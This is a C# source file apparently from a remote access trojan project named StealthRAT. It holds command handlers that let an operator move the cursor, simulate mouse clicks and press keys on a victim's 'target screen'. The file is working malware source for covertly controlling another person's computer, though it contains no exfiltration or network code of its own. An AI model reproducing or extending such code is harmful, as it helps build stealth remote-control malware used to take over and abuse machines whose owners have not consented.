using StealthRAT.Interfaces;
using StealthRAT.Models;
using StealthRAT.Utilities;

namespace StealthRAT.Handlers;

/// <summary>
/// Handles the "mousemove" command to reposition the cursor on the target screen.
/// Validates coordinate parameters before invoking the native API.
/// </summary>
public sealed class MouseMoveHandler : ICommandHandler
{
    /// <inheritdoc/>
    public string CommandName => "mousemove";

    /// <inheritdoc/>
    public Task<string> ExecuteAsync(string[] args, CommandContext context)
    {
        if (args.Length < 2)
        {
            return Task.FromResult("ERR: Usage: mousemove <x> <y>");
        }

        if (!int.TryParse(args[0], out int x) || !int.TryParse(args[1], out int y))
        {
            return Task.FromResult("ERR: Coordinates must be valid integers");
        }

        if (x < 0 || y < 0)
        {
            return Task.FromResult("ERR: Coordinates must be non-negative");
        }

        bool success = NativeInputHelper.MoveCursor(x, y);
        return Task.FromResult(success
            ? $"OK: Mouse moved to ({x}, {y})"
            : $"ERR: Failed to move cursor to ({x}, {y})");
    }
}

/// <summary>
/// Handles the "mouseclick" command to simulate mouse button clicks.
/// Supports both left-click (default) and right-click operations.
/// </summary>
public sealed class MouseClickHandler : ICommandHandler
{
    /// <inheritdoc/>
    public string CommandName => "mouseclick";

    /// <inheritdoc/>
    public Task<string> ExecuteAsync(string[] args, CommandContext context)
    {
        bool isRightClick = args.Length > 0 &&
            string.Equals(args[0], "right", StringComparison.OrdinalIgnoreCase);

        NativeInputHelper.SimulateClick(isRightClick, ServerConfiguration.MouseClickDelayMs);

        string clickType = isRightClick ? "Right" : "Left";
        return Task.FromResult($"OK: {clickType} click performed");
    }
}

/// <summary>
/// Handles the "keypress" command to simulate keyboard key presses.
/// Supports single alphanumeric characters and named special keys.
/// </summary>
public sealed class KeyPressHandler : ICommandHandler
{
    /// <inheritdoc/>
    public string CommandName => "keypress";

    /// <inheritdoc/>
    public Task<string> ExecuteAsync(string[] args, CommandContext context)
    {
        if (args.Length == 0)
        {
            string supportedKeys = string.Join(", ", NativeInputHelper.GetSupportedKeys().Take(20));
            return Task.FromResult($"ERR: Usage: keypress <key>. Supported: {supportedKeys}...");
        }

        string keyName = args[0];
        bool success = NativeInputHelper.SimulateKeyPress(keyName, ServerConfiguration.KeyPressDelayMs);

        return Task.FromResult(success
            ? $"OK: Key '{keyName.ToUpperInvariant()}' pressed"
            : $"ERR: Unsupported key '{keyName}'. Use single alphanumeric or special key names (ENTER, SPACE, TAB, etc.)");
    }
}
